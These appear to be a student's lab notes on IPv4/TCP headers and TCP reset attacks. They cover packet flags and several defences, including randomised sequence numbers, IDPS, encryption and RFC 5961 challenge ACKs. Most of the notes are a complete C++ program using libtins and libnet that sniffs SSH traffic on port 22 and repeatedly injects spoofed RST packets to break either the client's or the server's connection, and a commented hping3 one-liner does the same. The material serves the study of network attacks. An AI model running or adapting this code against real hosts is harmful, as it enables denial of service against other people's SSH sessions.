# Setup
	- Same as before setup 3 machine
```C
//installing libraries
sudo apt install libnet1 libnet1-dev -y //for sending packets
sudo apt install libpcap-dev libnet1-dev -y  //for recieveing packets (used by wireshark)
```

 ==COMPILE ALL FILES WITH `gcc name.c -lpcap -lnet`== 

	
# IPv4 Packet Headers
	- packet consists of header + payload
	- header about 20 bytes of data + options
	- payload extends from 0 - 1480 bytes (can be bigger than this)


![[Pasted image 20250226221027.png]]
	- Here each row is 4*8 = 32 bits
		- version is which version of IPvX
		- IHL (internet header length) how big the header ? (represented in how many rows there are, so if it said 5, then there would be 5 * (4 * 8) = 5 * 32 bits in header)
		- 



	- What is the type of attack
		- TCP Reset attack
		- attacker sends spoofed TCP packets to one or both the machines
		- an out-of-band operation. Meaning the attakcer cant modify the legitimate packets send by the machines
		- HOW TO PREVENT THIS
			- Improved algorithms to generate the inital sequence number. (ISN)
			- IDPS (intrusion detection and prevention systems) that analyse packets and block suspicious packets using heuristics.
			- encryption. TSL, SSL or IPsec create secure tunnels that encrypt data and TCP headers making it difficult to tamper with
			- verification of Packets before forwarding them.
				- inside the router or switch itself cross-reference the source mentioned and actual source address.
	- PACKET FLAGS
		- URG
			- incoming data is important and should prioritized. Rarely used in real life.
		- ACK
			- when this bit is set. Then the acknowledgment number is valid and should be present. Indicates succesful transfer of data.
			- part of TCP reliability
		- PSH
			- used in SSH connection to skip buffer queue.
		- RST 
			- used to abruptly terminate a connection. No further communication is required
		- SYN
			- start of a TCP connection. Used to synchronize TCP sequence numbers.
		- FIN
			- used to finish a TCP connection. 
	- hping3
		- doesn't need to create a socket connection
		- but uses raw sockets that require sudo access.
		- Allows it to bypass L3 layer OS stack and directly use its own protocols.
		- SOCK_STREAM for TCP and SOCK_DGRAM for UDP
	- TCP connections are uniquely identified by a 4-tuple: source IP, source port, destination IP, and destination port.
	-  Challenge ACKs
	    - Some systems implement additional security measures like challenge ACKs (RFC 5961). If a RST packet is received with a sequence number that is close but not exact, the system may send a challenge ACK instead of immediately accepting the RST. The attacker would then need to respond correctly to this challenge to complete their attack.
		- the RST recieved system sends a packet with expected sequence number. The client should rereply with that sequence number to break the connection



## Viewing packets going through your network
	
INSTALL : 
```ruby
sudo apt install libpcap-dev libnet1-dev -y
sudo apt install resolvconf -y
sudo apt-get install libpcap-dev libssl-dev cmake g++
sudo apt-get install libtins-dev
sudo apt-get install libnet1-dev 
```

	for this we are going to use libtins, a packet sniffing library for cpp

==while compiling use this ==
`g++ -std=c++11  tcp.cpp -ltins -lnet`

```cpp
#include <tins/tins.h>
#include <iostream>
#include <string>
#include <cstdlib> // Required for system()
#include <time.h>
#include <thread>
#include <libnet.h>

using namespace Tins;
using namespace std;

time_t time_start = time(0);

string command1, command2, ip_server, ip_client;
long long int server_port, client_port, seq, ack;

bool callback(const PDU &pdu)
{
    // Retrieve the IP layer
    const IP &ip = pdu.rfind_pdu<IP>();

    // Retrieve the TCP layer
    const TCP &tcp = pdu.rfind_pdu<TCP>();
    if (tcp.dport() == 22 || tcp.sport() == 22)
    {
        long long int breakWho = -1;
        // cout << "Which side should be broken (1 for server 2 for client)?? \n";
        //  cin >> breakWho;
        if (tcp.dport() == 22)
        {
            // sudo hping3 -R -p 22 -s <client_port> -a <clientip> -M <seq> <server_ip>
            ip_client = ip.src_addr().to_string();
            ip_server = ip.dst_addr().to_string();
            client_port = tcp.sport();
            server_port = tcp.dport();
            seq = tcp.seq();
            ack = tcp.ack_seq();
        }
        else
        {
            // sudo hping3 -R -p 22 -s <client_port> -a <clientip> -M <seq> <server_ip>
            ip_server = ip.src_addr().to_string();
            ip_client = ip.dst_addr().to_string();
            server_port = tcp.sport();
            client_port = tcp.dport();
            seq = tcp.seq();
            ack = tcp.ack_seq();
        }
    }

    return true;
}

void libnet(long long int seqnum, long long int src_port, long long int dst_port, string src_ip_str, string dst_ip_str, long long int ack)
{
    libnet_t *l;
    char errbuf[LIBNET_ERRBUF_SIZE];

    // Initialize libnet
    l = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        return;
    }

    // Define source and destination IPs
    char *src_ip = (char *)dst_ip_str.c_str(); // Change to your source IP
    char *dst_ip = (char *)src_ip_str.c_str(); // Change to your destination IP

    cout << "src_ip:" << src_ip << endl;
    cout << "dst_ip:" << dst_ip << endl;

    uint32_t src_ip_addr = libnet_name2addr4(l, src_ip, LIBNET_RESOLVE);
    uint32_t dst_ip_addr = libnet_name2addr4(l, dst_ip, LIBNET_RESOLVE);

    // Build TCP header (SYN flag set)
    libnet_build_tcp(
        src_port,     // Source port
        dst_port,     // Destination port
        seqnum,       // Sequence number
        ack,          // Acknowledgment number
        TH_RST,       // Control flags (SYN)
        488,          // Window size
        0,            // Checksum (0 for auto-calculate)
        10,           // Urgent pointer
        LIBNET_TCP_H, // Total length
        NULL,         // Payload
        0,            // Payload size
        l,            // Libnet context
        0             // Packet id (0 to create a new one)
    );

    // Build IP header
    libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H, // Total length
        0,                            // TOS
        242,                          // ID
        0,                            // Fragmentation
        64,                           // TTL
        IPPROTO_TCP,                  // Protocol
        0,                            // Checksum (0 for auto-calculate)
        src_ip_addr,                  // Source IP
        dst_ip_addr,                  // Destination IP
        NULL,                         // Payload
        0,                            // Payload size
        l,                            // Libnet context
        0                             // Packet id (0 to create a new one)
    );

    // Send the packet
    if (libnet_write(l) == -1)
    {
        fprintf(stderr, "Error sending packet: %s\n", libnet_geterror(l));
    }
    else
    {
        printf("Packet sent successfully!\n");
    }

    // Cleanup
    libnet_destroy(l);
    return;
}

void executeCommand(long long int option)
{
    while (true)
    {
        if (time(0) - time_start > 1)
        {
            time_start = time(0);
            cout << "{"
                 << "\"seq_num_client_to_server\": " << seq << ", "
                 << "\"seq_num_server_to_client\": " << ack << ", "
                 << "\"client_port\": " << client_port << ", "
                 << "\"server_port\": " << server_port << ", "
                 << "\"ip_server\": \"" << ip_server << "\", "
                 << "\"ip_client\": \"" << ip_client << "\""
                 << "}" << endl;
            if (option)
            {
                libnet(ack, client_port, server_port, ip_server, ip_client, seq);
            }
            else
            {

                // libnet(seq_num_client_to_server, client_port, server_port, ip_server, ip_client);
                libnet(ack, server_port, client_port, ip_client, ip_server, seq);
            }
        }
    }
}

int main()
{
    try
    {
        cout << "Break Server(1) or Client(0)??" << endl;
        long long int k;
        cin >> k;
        thread t(executeCommand, k);
        SnifferConfiguration config;
        config.set_promisc_mode(true);
        config.set_filter("tcp and port 22");

        Sniffer sniffer("enp0s3", config);
        sniffer.sniff_loop(callback);
    }
    catch (const std::exception &ex)
    {
        std::cerr << "Error: " << ex.what() << std::endl;
    }
    return 0;
}

```
